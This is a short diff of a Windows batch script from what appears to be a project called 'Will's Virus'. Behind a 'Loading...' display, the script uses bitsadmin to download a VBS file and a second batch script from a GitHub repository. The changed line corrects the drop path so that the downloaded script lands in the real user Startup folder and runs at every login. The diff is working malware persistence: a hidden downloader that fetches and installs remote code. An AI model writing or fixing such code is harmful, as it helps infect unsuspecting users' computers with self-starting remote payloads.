@@ -19,7 +19,7 @@ ping localhost -n 1 >nul
 cls
 echo Loading...
 if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
-if not exist "%temp%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%temp%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" >nul
+if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Willisvirus2.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
